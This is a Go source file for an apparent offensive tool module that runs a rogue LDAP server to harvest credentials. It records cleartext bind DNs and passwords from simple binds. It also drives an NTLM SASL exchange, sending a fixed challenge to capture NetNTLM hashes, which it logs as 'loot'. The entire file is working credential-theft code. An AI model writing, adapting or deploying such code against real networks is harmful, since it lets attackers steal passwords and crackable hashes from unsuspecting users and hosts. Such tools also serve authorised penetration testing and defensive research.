// Package ldap implements a rogue LDAP server that captures credentials from
// bind requests: cleartext from a simple bind, and NetNTLM hashes from an
// NTLM / GSS-SPNEGO SASL bind.
package ldap

import (
	"bufio"
	"context"
	"errors"
	"fmt"
	"io"
	"net"
	"time"

	"lantern/internal/core"
	"lantern/internal/ntlm"
)

const (
	ServiceName = "ldap"
	DefaultPort = 389
	readTimeout = 30 * time.Second
	maxMessage  = 1 << 20
)

type Module struct {
	server *core.TCPServer
	Logger *core.Logger
}

func New(logger *core.Logger) *Module {
	m := &Module{Logger: logger}
	m.server = &core.TCPServer{
		Service: "LDAP",
		Address: "0.0.0.0",
		Port:    DefaultPort,
		Logger:  logger,
		Handler: m.handle,
	}
	return m
}

func (m *Module) Name() string      { return ServiceName }
func (m *Module) HasListener() bool { return true }
func (m *Module) HasPoisoner() bool { return false }

func (m *Module) StartPoisoner(context.Context, core.Config) error {
	return fmt.Errorf("LDAP poisoning is not supported")
}

func (m *Module) StartListener(ctx context.Context, cfg core.Config) error {
	m.server.Logger = m.Logger
	return m.server.Start(ctx, cfg)
}

func (m *Module) Stop() { m.server.Stop() }

func (m *Module) handle(ctx context.Context, conn net.Conn) {
	client := core.ClientIP(conn)
	reader := bufio.NewReader(conn)

	for {
		core.SetDeadline(ctx, conn, readTimeout)
		msg, err := readLDAPMessage(reader)
		if err != nil {
			return
		}
		if !m.process(conn, client, msg) {
			return
		}
	}
}

// process handles one LDAPMessage, returning whether to keep the connection
// open (needed for the NTLM Type 1 -> 3 SASL exchange).
func (m *Module) process(conn net.Conn, client string, msg []byte) bool {
	messageID, op, opTag, err := parseLDAPMessage(msg)
	if err != nil {
		return false
	}
	// BindRequest is [APPLICATION 0] => 0x60.
	if opTag != 0x60 {
		m.packet("LDAP", "Ignoring non-bind operation 0x%02x from %s", opTag, client)
		// Reply with a generic success for unbind/search so clients proceed.
		return opTag != 0x42 // UnbindRequest (0x42) ends the session.
	}

	bind, err := parseBindRequest(op)
	if err != nil {
		m.packet("LDAP", "Malformed bind from %s: %v", client, err)
		return false
	}

	switch bind.authType {
	case authSimple:
		m.captureSimple(client, bind.name, string(bind.simplePassword))
		_, _ = conn.Write(buildBindResponse(messageID, resultInvalidCredentials, nil))
		return false
	case authSASL:
		return m.handleSASL(conn, client, messageID, bind)
	default:
		_, _ = conn.Write(buildBindResponse(messageID, resultInvalidCredentials, nil))
		return false
	}
}

func (m *Module) handleSASL(conn net.Conn, client string, messageID int, bind bindRequest) bool {
	creds := bind.saslCredentials
	msgType, _, ok := ntlm.MessageType(creds)
	if !ok {
		m.packet("LDAP", "Unsupported SASL mechanism %q from %s", bind.saslMechanism, client)
		_, _ = conn.Write(buildBindResponse(messageID, resultAuthMethodNotSupported, nil))
		return false
	}
	switch msgType {
	case 1:
		flags, _ := ntlm.Type1Flags(creds)
		challenge := ntlm.BuildType2(flags, ntlm.DefaultChallenge)
		m.packet("NTLMSSP", "SASL Type 1 from %s, sending Type 2 challenge", client)
		_, _ = conn.Write(buildBindResponse(messageID, resultSaslBindInProgress, challenge))
		return true
	case 3:
		id, _ := ntlm.ParseType3(creds, ntlm.DefaultChallenge)
		m.captureNTLM(client, id)
		_, _ = conn.Write(buildBindResponse(messageID, resultInvalidCredentials, nil))
		return false
	default:
		_, _ = conn.Write(buildBindResponse(messageID, resultInvalidCredentials, nil))
		return false
	}
}

func (m *Module) captureSimple(client, name, password string) {
	if m.Logger == nil {
		return
	}
	if name == "" {
		name = "<anonymous>"
	}
	m.Logger.Loot(
		fmt.Sprintf("[LDAP] Simple bind credentials from %s", client),
		"[LDAP] Bind DN  : %s\n[LDAP] Password : %q\n[LDAP] Hash     : %s:%s",
		name, password, name, password)
}

func (m *Module) captureNTLM(client string, id ntlm.Identity) {
	if m.Logger == nil {
		return
	}
	hostname := id.Workstation
	if hostname == "" {
		hostname = "<not provided>"
	}
	hash := id.Hash
	if hash == "" {
		hash = "<not captured>"
	}
	m.Logger.Loot(
		fmt.Sprintf("[LDAP] NetNTLMv%d hash from %s", id.Version, client),
		"[LDAP] Hostname : %s\n[LDAP] Username : %s\n[LDAP] Hash     : %s",
		hostname, id.Display(), hash)
}

func (m *Module) packet(packetType, format string, args ...any) {
	if m.Logger != nil {
		m.Logger.Packet(ServiceName, packetType, format, args...)
	}
}

// ---- BER / LDAP encoding ----

const (
	authSimple = iota
	authSASL
	authUnknown

	resultInvalidCredentials     = 49
	resultSaslBindInProgress     = 14
	resultAuthMethodNotSupported = 7
)

type bindRequest struct {
	name            string
	authType        int
	simplePassword  []byte
	saslMechanism   string
	saslCredentials []byte
}

// readLDAPMessage reads one complete LDAPMessage (outer SEQUENCE) from r.
func readLDAPMessage(r *bufio.Reader) ([]byte, error) {
	tag, err := r.ReadByte()
	if err != nil {
		return nil, err
	}
	if tag != 0x30 {
		return nil, errors.New("expected LDAPMessage SEQUENCE")
	}
	length, lenBytes, err := readBERLength(r)
	if err != nil {
		return nil, err
	}
	if length < 0 || length > maxMessage {
		return nil, fmt.Errorf("invalid LDAP message length %d", length)
	}
	content := make([]byte, length)
	if _, err := io.ReadFull(r, content); err != nil {
		return nil, err
	}
	msg := make([]byte, 0, 1+len(lenBytes)+length)
	msg = append(msg, tag)
	msg = append(msg, lenBytes...)
	msg = append(msg, content...)
	return msg, nil
}

func readBERLength(r *bufio.Reader) (int, []byte, error) {
	first, err := r.ReadByte()
	if err != nil {
		return 0, nil, err
	}
	if first < 0x80 {
		return int(first), []byte{first}, nil
	}
	count := int(first & 0x7f)
	if count == 0 || count > 4 {
		return 0, nil, fmt.Errorf("unsupported BER length form 0x%02x", first)
	}
	raw := make([]byte, count)
	if _, err := io.ReadFull(r, raw); err != nil {
		return 0, nil, err
	}
	length := 0
	for _, b := range raw {
		length = length<<8 | int(b)
	}
	return length, append([]byte{first}, raw...), nil
}

// tlv parses one BER tag-length-value element from data at offset, returning
// the tag, the value bytes and the offset following the element.
func tlv(data []byte, offset int) (tag byte, value []byte, next int, err error) {
	if offset >= len(data) {
		return 0, nil, 0, errors.New("BER element past end of buffer")
	}
	tag = data[offset]
	offset++
	if offset >= len(data) {
		return 0, nil, 0, errors.New("BER length past end of buffer")
	}
	length := int(data[offset])
	offset++
	if length >= 0x80 {
		count := length & 0x7f
		if count == 0 || count > 4 || offset+count > len(data) {
			return 0, nil, 0, errors.New("invalid BER length")
		}
		length = 0
		for i := 0; i < count; i++ {
			length = length<<8 | int(data[offset])
			offset++
		}
	}
	if offset+length > len(data) {
		return 0, nil, 0, errors.New("BER value past end of buffer")
	}
	return tag, data[offset : offset+length], offset + length, nil
}

// parseLDAPMessage returns the message ID, the protocolOp value, its tag and
// any error. It operates on the full raw message (including outer SEQUENCE).
func parseLDAPMessage(msg []byte) (messageID int, op []byte, opTag byte, err error) {
	_, seq, _, err := tlv(msg, 0)
	if err != nil {
		return 0, nil, 0, err
	}
	idTag, idVal, next, err := tlv(seq, 0)
	if err != nil {
		return 0, nil, 0, err
	}
	if idTag != 0x02 {
		return 0, nil, 0, errors.New("missing message ID")
	}
	messageID = decodeInt(idVal)
	opTag, op, _, err = tlv(seq, next)
	if err != nil {
		return 0, nil, 0, err
	}
	return messageID, op, opTag, nil
}

func parseBindRequest(op []byte) (bindRequest, error) {
	var bind bindRequest
	// version INTEGER
	_, _, next, err := tlv(op, 0)
	if err != nil {
		return bind, err
	}
	// name OCTET STRING (bind DN)
	nameTag, nameVal, next, err := tlv(op, next)
	if err != nil {
		return bind, err
	}
	if nameTag == 0x04 {
		bind.name = string(nameVal)
	}
	// authentication CHOICE
	authTag, authVal, _, err := tlv(op, next)
	if err != nil {
		return bind, err
	}
	switch authTag {
	case 0x80: // simple [0] primitive
		bind.authType = authSimple
		bind.simplePassword = authVal
	case 0xa3: // sasl [3] constructed SEQUENCE
		bind.authType = authSASL
		mechTag, mechVal, mnext, err := tlv(authVal, 0)
		if err == nil && mechTag == 0x04 {
			bind.saslMechanism = string(mechVal)
			if _, credVal, _, err := tlv(authVal, mnext); err == nil {
				bind.saslCredentials = credVal
			}
		}
	default:
		bind.authType = authUnknown
	}
	return bind, nil
}

func decodeInt(b []byte) int {
	v := 0
	for _, c := range b {
		v = v<<8 | int(c)
	}
	return v
}

// buildBindResponse builds an LDAPMessage carrying a BindResponse with the
// given result code and optional server SASL credentials.
func buildBindResponse(messageID, resultCode int, saslCreds []byte) []byte {
	// BindResponse ::= [APPLICATION 1] SEQUENCE {
	//   resultCode ENUMERATED, matchedDN OCTET STRING, diagnosticMessage OCTET STRING,
	//   serverSaslCreds [7] OCTET STRING OPTIONAL }
	body := berElement(0x0a, []byte{byte(resultCode)}) // resultCode ENUMERATED
	body = append(body, berElement(0x04, nil)...)      // matchedDN
	body = append(body, berElement(0x04, nil)...)      // diagnosticMessage
	if saslCreds != nil {
		body = append(body, berElement(0x87, saslCreds)...) // serverSaslCreds [7]
	}
	bindResponse := berElement(0x61, body)

	msg := berElement(0x02, encodeInt(messageID))
	msg = append(msg, bindResponse...)
	return berElement(0x30, msg)
}

func berElement(tag byte, value []byte) []byte {
	out := []byte{tag}
	out = append(out, encodeBERLength(len(value))...)
	out = append(out, value...)
	return out
}

func encodeBERLength(n int) []byte {
	if n < 0x80 {
		return []byte{byte(n)}
	}
	var raw []byte
	for v := n; v > 0; v >>= 8 {
		raw = append([]byte{byte(v)}, raw...)
	}
	return append([]byte{byte(0x80 | len(raw))}, raw...)
}

func encodeInt(n int) []byte {
	if n == 0 {
		return []byte{0}
	}
	var raw []byte
	for v := n; v > 0; v >>= 8 {
		raw = append([]byte{byte(v)}, raw...)
	}
	// Keep the value positive: prepend a zero byte when the top bit is set.
	if raw[0]&0x80 != 0 {
		raw = append([]byte{0x00}, raw...)
	}
	return raw
}
